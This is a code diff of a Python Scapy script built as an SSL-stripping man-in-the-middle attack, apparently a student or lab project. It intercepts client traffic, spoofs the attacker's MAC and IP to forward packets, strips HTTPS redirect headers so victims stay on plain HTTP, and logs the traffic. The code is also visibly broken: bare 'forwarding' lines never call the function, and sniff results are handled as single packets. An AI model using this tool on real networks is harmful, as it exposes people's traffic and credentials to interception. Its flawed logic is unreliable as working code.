@@ -13,9 +13,21 @@ attackerMac = ""
 
 sc.load_layer("http")
 
+def stripping(cIP, cMAC, sIP, sMAC, aIP, aMAC):
+    clientIP = cIP
+    clientMAC = cMAC
+    serverIP = sIP
+    serverMac = sMAC
+    attackerIP = aIP
+    attackerMac = aMAC
+    while True:
+        sc.sniff(filter="tcp port 80 or tcp port 443", prn=handle_packet, store=False)
+
+
 def handle_packet(pkt):
     global clientIP, clientMac
     
+    #Handle http(s) request from client
     clientIP = pkt[sc.IP].src
     clientMac = pkt[sc.Ether].src
 
@@ -23,31 +35,21 @@ def handle_packet(pkt):
         return
     dstPort = pkt[sc.TCP].dport
 
+    #determine wether client send http or https
     if dstPort == 443:
         print(f"HTTPS request from client: {pkt.summary()}")
         forward_to_server(pkt)
         forwarding
     if dstPort == 80:
         print(f"HTTP request from client: {pkt.summary()}")
-        log_packet("client -> server", pkt)
+        forward_to_server(pkt)
    
-    ether = sc.Ether(src=attackerMac, dst=serverMac)
-    ip = sc.IP(src=attackerIP, dst=serverIP)
-    tcp = sc.TCP(
-        sport=pkt[sc.TCP].sport,
-        dport=pkt[sc.TCP].dport,
-        seq=pkt[sc.TCP].seq,
-        ack=pkt[sc.TCP].ack,
-        flags=pkt[sc.TCP].flags
-    )
-    if pkt.haslayer(sc.Raw):
-        raw = sc.Raw(load=pkt[sc.Raw].load)
-        forward_pkt = ether / ip / tcp / raw
-    else:
-        forward_pkt = ether / ip / tcp
-    sc.sendp(forward_pkt, iface=sc.conf.iface, verbose=False)
+   #wait for server response
+
     pkt = sc.sniff(filter=f"tcp and src host {serverIP} and dst port 80", store=False)
     log_packet("server -> client", pkt)
+
+    #if server sends reset. reset
     if (is_rst(pkt)):
         forward_to_client(pkt)
         return
@@ -58,17 +60,6 @@ def handle_packet(pkt):
     log_packet("server -> client", pkt)
     forwarding
 
-def forwarding():
-    while (True):
-        nxt_pkt = sc.sniff(filter="http")
-        if (nxt_pkt[sc.IP].src == clientIP):
-            forward_to_server(nxt_pkt)
-            if (is_rst(nxt_pkt) or is_tcp_fin(nxt_pkt)):
-                return
-        if (nxt_pkt[sc.IP].src == serverIP):
-            forward_to_client(nxt_pkt)
-            if (is_rst(nxt_pkt) or is_tcp_fin(nxt_pkt)):
-                return
 
 
 def filter_response(pkt):
@@ -78,18 +69,16 @@ def filter_response(pkt):
         b"Location: https://" in pkt[sc.Raw].load
     )
 
-def is_rst(pkt):
-    return sc.TCP in pkt and 'R' in pkt[sc.TCP].flags
-
-def is_tcp_fin(pkt):
-    return sc.TCP in pkt and 'F' in pkt[sc.TCP].flags
 
 def resp_ssl_strip(pkt):
     print(f"Packet from server to client: {pkt.summary()}")
     
     if not filter_response(pkt):
-        return False
+        forward_to_client(pkt)
+        forwarding
+        return
 
+    #remove https switch request
     data = pkt[sc.Raw].load
     lines = data.split(b"\r\n")
     stripped_lines = [line for line in lines if not line.startswith(b"Location: https://")]
@@ -116,7 +105,7 @@ def resp_ssl_strip(pkt):
         flags="A"
     )
     sc.send(ack_pkt, verbose=False)
-    return True
+    return
 
 def is_server_ack(pkt):
     return (
@@ -126,6 +115,38 @@ def is_server_ack(pkt):
         and pkt[sc.TCP].flags == "A" 
     )
 
+#check if packet is rst or fin
+def is_rst(pkt):
+    return sc.TCP in pkt and 'R' in pkt[sc.TCP].flags
+
+def is_tcp_fin(pkt):
+    return sc.TCP in pkt and 'F' in pkt[sc.TCP].flags
+
+
+
+
+#keep forwarding from client to server and log all packets
+def forward(cIP, cMAC, sIP, sMAC, aIP, aMAC):
+    clientIP = cIP
+    clientMAC = cMAC
+    serverIP = sIP
+    serverMac = sMAC
+    attackerIP = aIP
+    attackerMac = aMAC
+    forwarding
+
+def forwarding():
+    while (True):
+        nxt_pkt = sc.sniff(filter="http")
+        if (nxt_pkt[sc.IP].src == clientIP):
+            forward_to_server(nxt_pkt)
+            if (is_rst(nxt_pkt) or is_tcp_fin(nxt_pkt)):
+                return
+        if (nxt_pkt[sc.IP].src == serverIP):
+            forward_to_client(nxt_pkt)
+            if (is_rst(nxt_pkt) or is_tcp_fin(nxt_pkt)):
+                return
+            
 def forward_to_client(pkt):
     ether = sc.Ether(src=attackerMac, dst=clientMac)
     ip = sc.IP(src=attackerIP, dst=clientIP)
@@ -163,25 +184,10 @@ def forward_to_server(pkt):
     sc.sendp(new_pkt, iface=sc.conf.iface, verbose=False)
     log_packet("client -> server", pkt)
 
+
+            
+
+
 def log_packet(direction, pkt):
     with open("packet_log.txt", "a") as log_file:
         log_file.write(f"[{direction}] {pkt.summary()}\n")
-
-def stripping(cIP, cMAC, sIP, sMAC, aIP, aMAC):
-    clientIP = cIP
-    clientMAC = cMAC
-    serverIP = sIP
-    serverMac = sMAC
-    attackerIP = aIP
-    attackerMac = aMAC
-    while True:
-        sc.sniff(filter="tcp port 80 or tcp port 443", prn=handle_packet, store=False)
-
-def forward(cIP, cMAC, sIP, sMAC, aIP, aMAC):
-    clientIP = cIP
-    clientMAC = cMAC
-    serverIP = sIP
-    serverMac = sMAC
-    attackerIP = aIP
-    attackerMac = aMAC
-    forwarding
